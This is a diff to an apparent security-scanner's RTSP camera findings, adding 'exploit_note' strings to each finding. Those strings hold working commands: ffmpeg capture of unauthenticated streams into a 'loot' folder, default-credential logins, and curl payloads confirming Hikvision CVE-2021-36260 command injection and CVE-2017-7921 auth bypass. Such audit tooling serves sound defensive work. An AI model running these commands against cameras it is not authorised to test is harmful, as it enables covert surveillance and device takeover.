@@ -786,7 +786,12 @@ def findings(hosts: list[Host], probes: dict | None = None,
                     "Require authentication on every RTSP stream; segment cameras "
                     "onto a dedicated VLAN and firewall RTSP off the general "
                     "network.",
-                    ["CWE-306", "CWE-284"], kind="rtsp_unauth_stream"))
+                    ["CWE-306", "CWE-284"], kind="rtsp_unauth_stream",
+                    exploit_note=(
+                        f"ffmpeg -rtsp_transport tcp -i rtsp://{h.ip}:{p.portid}/ -t 5 "
+                        f"-c copy loot/rtsp_{h.ip}.mkv; "
+                        f"ffmpeg -i loot/rtsp_{h.ip}.mkv -vframes 1 loot/rtsp_{h.ip}.jpg."),
+                    depth_tier="t2"))
             elif pr.get("sdp"):
                 sdp = pr["sdp"]
                 out.append(_finding(
@@ -799,7 +804,12 @@ def findings(hosts: list[Host], probes: dict | None = None,
                     f"ffprobe -rtsp_transport tcp rtsp://{h.ip}:{p.portid}/",
                     "Return 401 on DESCRIBE without a valid Authorization header "
                     "rather than serving SDP unauthenticated.",
-                    ["CWE-200"], kind="rtsp_sdp_disclosure"))
+                    ["CWE-200"], kind="rtsp_sdp_disclosure",
+                    exploit_note=(
+                        f"ffprobe -rtsp_transport tcp rtsp://{h.ip}:{p.portid}/; "
+                        f"then ffplay -rtsp_transport tcp rtsp://{h.ip}:{p.portid}/"
+                        "<control-uri-from-sdp>."),
+                    depth_tier="t1"))
 
             paths_seen = pr.get("paths") or []
             vendor_hits = [x for x in paths_seen if x["status"] in (200, 401)]
@@ -818,7 +828,11 @@ def findings(hosts: list[Host], probes: dict | None = None,
                     f"{vendor_hits[0]['path']}",
                     "Do not expose vendor-canonical stream paths without auth; "
                     "return a uniform 401 on every DESCRIBE.",
-                    ["CWE-425", "CWE-200"], kind="rtsp_path_enum"))
+                    ["CWE-425", "CWE-200"], kind="rtsp_path_enum",
+                    exploit_note=(
+                        "For each 401-answering path try camera defaults: "
+                        f"openRTSP -u admin -p 12345 rtsp://{h.ip}:{p.portid}<path>"),
+                    depth_tier="t1"))
 
             for cve in pr.get("cve_hits") or []:
                 sev = "critical" if cve.get("kev") else "high"
@@ -835,7 +849,14 @@ def findings(hosts: list[Host], probes: dict | None = None,
                     f"{h.ip}:{p.portid}",
                     "Apply the vendor firmware update; if unavailable, isolate "
                     "the device on a management VLAN with no inbound access.",
-                    cve.get("cwe") or ["CWE-1035"], kind="rtsp_known_vuln"))
+                    cve.get("cwe") or ["CWE-1035"], kind="rtsp_known_vuln",
+                    exploit_note=(
+                        f"curl -k -X PUT 'http://{h.ip}/SDK/webLanguage' -d "
+                        "'<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
+                        "<language>$(id)</language>' — confirms CVE-2021-36260; "
+                        f"curl 'http://{h.ip}/Security/users?auth=YWRtaW46MTEK' — "
+                        "confirms CVE-2017-7921."),
+                    depth_tier="t0"))
 
             if pr.get("tls"):
                 cn = pr.get("cert_cn") or ""
@@ -870,7 +891,15 @@ def findings(hosts: list[Host], probes: dict | None = None,
                     "Change the password on every camera immediately — the "
                     "vendor factory default is public knowledge. Enforce a "
                     "per-device unique password on provisioning.",
-                    ["CWE-798", "CWE-521"], kind="rtsp_default_cred"))
+                    ["CWE-798", "CWE-521"], kind="rtsp_default_cred",
+                    exploit_note=(
+                        f"openRTSP -u {hit['user']} -p {hit['password'] or ''} "
+                        f"rtsp://{h.ip}:{p.portid}/; "
+                        f"curl -u {hit['user']}:{hit['password'] or ''} "
+                        f"http://{h.ip}/ISAPI/System/deviceInfo (Hikvision) or "
+                        f"http://{h.ip}/cgi-bin/magicBox.cgi?action=getSystemInfo "
+                        "(Dahua) to test admin-UI reuse; feed into ONVIF probe."),
+                    depth_tier="t3"))
 
     for tc in text_creds:
         tgt = f"{tc['host']}:{tc['port']}"
